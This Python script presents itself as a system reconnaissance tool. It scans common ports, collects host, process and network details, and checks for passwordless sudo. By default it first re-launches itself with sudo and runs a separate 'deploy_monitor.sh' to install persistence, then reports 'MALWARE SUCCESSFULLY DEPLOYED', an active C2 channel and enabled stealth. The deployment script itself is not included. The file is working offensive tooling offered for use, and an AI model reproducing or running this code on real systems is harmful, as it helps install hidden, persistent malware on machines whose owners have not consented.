#!/usr/bin/env python3
"""
Enhanced Quick Reconnaissance with Auto-Deployment
Advanced system assessment with integrated persistence deployment
"""

import socket
import subprocess
import platform
import time
import json
import os
import sys
from datetime import datetime

class EnhancedQuickRecon:
    def __init__(self, target="localhost"):
        self.target = target
        self.results = {}
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        
    def deploy_persistence(self):
        """Enhanced persistence deployment with error handling"""
        try:
            print("[+] Starting advanced persistence deployment...")
            
            # Locate deployment script
            deploy_script = os.path.join(self.script_dir, "deploy_monitor.sh")
            
            if not os.path.exists(deploy_script):
                print(f"[-] Deployment script not found: {deploy_script}")
                return False
            
            # Check root privileges
            if os.geteuid() != 0:
                print("[-] Root access required for deployment")
                print("[+] Attempting to restart with sudo...")
                
                # Restart with sudo
                result = subprocess.call([
                    'sudo', sys.executable, __file__, self.target
                ])
                return result == 0
            
            # Execute deployment script
            print("[+] Executing deployment script...")
            result = subprocess.call(['/bin/bash', deploy_script])
            
            if result == 0:
                print("[+] Persistence deployed successfully!")
                return True
            else:
                print(f"[-] Deployment failed with exit code: {result}")
                return False
        
        except Exception as e:
            print(f"[-] Deployment failed: {e}")
            return False
        
    def banner(self):
        """Display enhanced banner"""
        print("""
╔══════════════════════════════════════════════╗
║           ENHANCED SYSTEM RECON             ║
║      Advanced Assessment & Deployment       ║
╚══════════════════════════════════════════════╝
        """)
        
    def comprehensive_system_info(self):
        """Gather comprehensive system information"""
        print("[+] Gathering comprehensive system information...")
        
        try:
            # Enhanced system information
            self.results['comprehensive_info'] = {
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'architecture': platform.architecture(),
                'processor': platform.processor(),
                'users': self.get_logged_in_users(),
                'uptime': self.get_system_uptime(),
                'memory': self.get_memory_info(),
                'disk': self.get_disk_info()
            }
            
            # Display key information
            info = self.results['comprehensive_info']
            print(f"    Hostname: {info['hostname']}")
            print(f"    Platform: {info['platform']}")
            print(f"    Architecture: {info['architecture'][0]}")
            print(f"    Memory: {info['memory']}")
            print(f"    Disk: {info['disk']}")
            print(f"    Uptime: {info['uptime']}")
            
        except Exception as e:
            print(f"    Error: {e}")
    
    def advanced_network_scan(self):
        """Perform advanced network port scan"""
        print("[+] Scanning extended port range...")
        
        # Extended port list
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 
            1433, 3306, 3389, 5432, 5900, 8080, 8443
        ]
        
        open_ports = []
        filtered_ports = []
        
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    result = sock.connect_ex((self.target, port))
                    if result == 0:
                        service = self.get_service_name(port)
                        open_ports.append({'port': port, 'service': service})
                        print(f"    Port {port}/tcp open - {service}")
                    else:
                        filtered_ports.append(port)
            except:
                filtered_ports.append(port)
        
        self.results['open_ports'] = open_ports
        self.results['filtered_ports'] = filtered_ports
        print(f"[+] Found {len(open_ports)} open ports, {len(filtered_ports)} filtered")
    
    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 443: 'https', 993: 'imaps',
            1433: 'mssql', 3306: 'mysql', 3389: 'rdp', 5432: 'postgresql',
            5900: 'vnc', 8080: 'http-proxy', 8443: 'https-alt'
        }
        return services.get(port, 'unknown')
    
    def advanced_service_discovery(self):
        """Discover running services and processes"""
        print("[+] Analyzing running services...")
        
        try:
            # Get detailed process information
            result = subprocess.run(['ps', 'aux', '--sort=-%cpu'], 
                                  capture_output=True, text=True)
            processes = result.stdout.split('\n')[:15]  # Top 15 by CPU
            
            services = []
            for proc in processes[1:]:  # Skip header
                if proc.strip():
                    parts = proc.split()
                    if len(parts) > 10:
                        services.append({
                            'user': parts[0],
                            'pid': parts[1],
                            'cpu': parts[2],
                            'mem': parts[3],
                            'command': ' '.join(parts[10:])[:80]
                        })
            
            self.results['services'] = services
            print(f"    Found {len(services)} running processes")
            
            # Show top 5 CPU intensive processes
            print("    Top 5 CPU processes:")
            for service in services[:5]:
                print(f"      {service['pid']} {service['user']} {service['cpu']}% {service['command'][:50]}...")
            
        except Exception as e:
            print(f"    Error: {e}")
    
    def get_logged_in_users(self):
        """Get logged in users"""
        try:
            result = subprocess.run(['who'], capture_output=True, text=True)
            users = result.stdout.strip().split('\n')
            return len(users) if users[0] else 0
        except:
            return 0
    
    def get_system_uptime(self):
        """Get system uptime"""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
            
            # Convert to readable format
            days = int(uptime_seconds // 86400)
            hours = int((uptime_seconds % 86400) // 3600)
            minutes = int((uptime_seconds % 3600) // 60)
            
            return f"{days}d {hours}h {minutes}m"
        except:
            return "Unknown"
    
    def get_memory_info(self):
        """Get memory information"""
        try:
            result = subprocess.run(['free', '-h'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            if len(lines) > 1:
                memory_line = lines[1].split()
                return f"{memory_line[1]} total, {memory_line[2]} used"
        except:
            pass
        return "Unknown"
    
    def get_disk_info(self):
        """Get disk information"""
        try:
            result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            if len(lines) > 1:
                disk_line = lines[1].split()
                return f"{disk_line[1]} total, {disk_line[2]} used ({disk_line[4]})"
        except:
            pass
        return "Unknown"
    
    def network_interface_info(self):
        """Get network interface information"""
        print("[+] Gathering network interface information...")
        
        try:
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            interfaces = []
            current_interface = None
            
            for line in result.stdout.split('\n'):
                if line.strip() and not line.startswith(' '):
                    if current_interface:
                        interfaces.append(current_interface)
                    current_interface = {'name': line.split(': ')[1], 'ips': []}
                elif 'inet ' in line:
                    ip_parts = line.strip().split()
                    if len(ip_parts) >= 2:
                        current_interface['ips'].append(ip_parts[1])
            
            if current_interface:
                interfaces.append(current_interface)
            
            self.results['network_interfaces'] = interfaces
            
            for interface in interfaces:
                print(f"    {interface['name']}: {', '.join(interface['ips'])}")
                
        except Exception as e:
            print(f"    Error: {e}")
    
    def security_assessment(self):
        """Basic security assessment"""
        print("[+] Performing basic security assessment...")
        
        security_findings = []
        
        # Check for open sensitive ports
        sensitive_ports = [22, 23, 21, 25, 53, 443]
        open_sensitive = [port for port in self.results.get('open_ports', []) 
                         if port['port'] in sensitive_ports]
        
        if open_sensitive:
            security_findings.append({
                'type': 'open_sensitive_ports',
                'ports': [p['port'] for p in open_sensitive],
                'risk': 'medium'
            })
            print(f"    Found {len(open_sensitive)} open sensitive ports")
        
        # Check sudo privileges
        try:
            result = subprocess.run(['sudo', '-n', 'true'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                security_findings.append({
                    'type': 'sudo_access',
                    'risk': 'high',
                    'details': 'Passwordless sudo access available'
                })
                print("    Passwordless sudo access available")
        except:
            pass
        
        self.results['security_findings'] = security_findings
    
    def generate_comprehensive_report(self):
        """Generate comprehensive reconnaissance report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"comprehensive_recon_{timestamp}.json"
        
        # Add metadata
        self.results['metadata'] = {
            'scan_time': datetime.now().isoformat(),
            'target': self.target,
            'tool': 'Enhanced Quick Recon',
            'version': '2.0'
        }
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n[+] Comprehensive report saved: {filename}")
        return filename
    
    def run_complete_assessment(self):
        """Run complete assessment with deployment"""
        self.banner()
        print(f"[*] Target: {self.target}")
        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        # Deploy persistence first
        print("\n[PHASE 1] DEPLOYING PERSISTENCE")
        deployment_success = self.deploy_persistence()
        
        if deployment_success:
            print("[+] Persistence phase completed successfully")
        else:
            print("[-] Persistence deployment had issues")
        
        # Run reconnaissance modules
        print("\n[PHASE 2] SYSTEM RECONNAISSANCE")
        self.comprehensive_system_info()
        self.advanced_network_scan()
        self.advanced_service_discovery()
        self.network_interface_info()
        self.security_assessment()
        
        # Generate final report
        print("\n[PHASE 3] REPORT GENERATION")
        report_file = self.generate_comprehensive_report()
        
        # Final summary
        print("\n" + "=" * 60)
        print("🎯 COMPREHENSIVE ASSESSMENT COMPLETED")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Persistence: {'DEPLOYED' if deployment_success else 'ISSUES'}")
        print(f"Open Ports: {len(self.results.get('open_ports', []))}")
        print(f"Running Processes: {len(self.results.get('services', []))}")
        print(f"Security Findings: {len(self.results.get('security_findings', []))}")
        print(f"Report: {report_file}")
        
        if deployment_success:
            print("\n[✅] MALWARE SUCCESSFULLY DEPLOYED AND PERSISTENT")
            print("[✅] C2 Communication: ACTIVE")
            print("[✅] Persistence: MULTI-LAYERED")
            print("[✅] Stealth: ENABLED")
        else:
            print("\n[⚠️] MALWARE DEPLOYMENT HAD ISSUES")
            print("[⚠️] Check permissions and dependencies")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Enhanced Quick Reconnaissance Tool")
    parser.add_argument("target", nargs="?", default="localhost", 
                       help="Target host (default: localhost)")
    parser.add_argument("--no-deploy", action="store_true", 
                       help="Skip persistence deployment")
    
    args = parser.parse_args()
    
    # Run reconnaissance
    recon = EnhancedQuickRecon(args.target)
    
    if args.no_deploy:
        # Run only reconnaissance without deployment
        recon.banner()
        recon.comprehensive_system_info()
        recon.advanced_network_scan()
        recon.advanced_service_discovery()
        recon.network_interface_info()
        recon.security_assessment()
        report_file = recon.generate_comprehensive_report()
        print(f"\n[+] Reconnaissance completed: {report_file}")
    else:
        # Run complete assessment with deployment
        recon.run_complete_assessment()

if __name__ == "__main__":
    main()
